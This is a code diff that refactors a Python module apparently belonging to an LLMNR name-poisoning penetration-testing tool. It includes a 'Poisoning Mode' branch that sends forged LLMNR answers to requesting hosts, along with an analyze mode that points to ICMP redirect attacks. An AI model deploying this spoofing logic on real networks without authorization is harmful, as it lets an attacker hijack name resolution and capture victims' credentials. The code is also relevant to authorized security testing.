@@ -14,28 +14,18 @@
 #
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
-import socket
 import struct
-import settings
 import fingerprint
 
 from packets import LLMNR_Ans
-from odict import OrderedDict
 from SocketServer import BaseRequestHandler
 from utils import *
 
+
 def Parse_LLMNR_Name(data):
 	NameLen = struct.unpack('>B',data[12])[0]
-	Name = data[13:13+NameLen]
-	return Name
+	return data[13:13+NameLen]
 
-def IsOnTheSameSubnet(ip, net):
-	net += '/24'
-	ipaddr = int(''.join([ '%02x' % int(x) for x in ip.split('.') ]), 16)
-	netstr, bits = net.split('/')
-	netaddr = int(''.join([ '%02x' % int(x) for x in netstr.split('.') ]), 16)
-	mask = (0xffffffff << (32 - int(bits))) & 0xffffffff
-	return (ipaddr & mask) == (netaddr & mask)
 
 def IsICMPRedirectPlausible(IP):
 	dnsip = []
@@ -43,22 +33,19 @@ def IsICMPRedirectPlausible(IP):
 		ip = line.split()
 		if len(ip) < 2:
 		   continue
-		if ip[0] == 'nameserver':
+		elif ip[0] == 'nameserver':
 			dnsip.extend(ip[1:])
 	for x in dnsip:
-		if x !="127.0.0.1" and IsOnTheSameSubnet(x,IP) == False:
+		if x != "127.0.0.1" and IsOnTheSameSubnet(x,IP) is False:
 			print color("[Analyze mode: ICMP] You can ICMP Redirect on this network.", 5)
 			print color("[Analyze mode: ICMP] This workstation (%s) is not on the same subnet than the DNS server (%s)." % (IP, x), 5)
 			print color("[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.", 5)
-		else:
-			pass
 
 if settings.Config.AnalyzeMode:
 	IsICMPRedirectPlausible(settings.Config.Bind_To)
 
-# LLMNR Server class
-class LLMNR(BaseRequestHandler):
 
+class LLMNR(BaseRequestHandler):  # LLMNR Server class
 	def handle(self):
 		data, soc = self.request
 		Name = Parse_LLMNR_Name(data)
@@ -68,24 +55,18 @@ class LLMNR(BaseRequestHandler):
 			return None
 
 		if data[2:4] == "\x00\x00" and Parse_IPV6_Addr(data):
-
+			Finger = None
 			if settings.Config.Finger_On_Off:
 				Finger = fingerprint.RunSmbFinger((self.client_address[0], 445))
-			else:
-				Finger = None
 
-			# Analyze Mode
 			if settings.Config.AnalyzeMode:
 				LineHeader = "[Analyze mode: LLMNR]"
 				print color("%s Request by %s for %s, ignoring" % (LineHeader, self.client_address[0], Name), 2, 1)
-
-			# Poisoning Mode
-			else:
+			else:  # Poisoning Mode
 				Buffer = LLMNR_Ans(Tid=data[0:2], QuestionName=Name, AnswerName=Name)
 				Buffer.calculate()
 				soc.sendto(str(Buffer), self.client_address)
 				LineHeader = "[*] [LLMNR]"
-
 				print color("%s  Poisoned answer sent to %s for name %s" % (LineHeader, self.client_address[0], Name), 2, 1)
 
 			if Finger is not None:
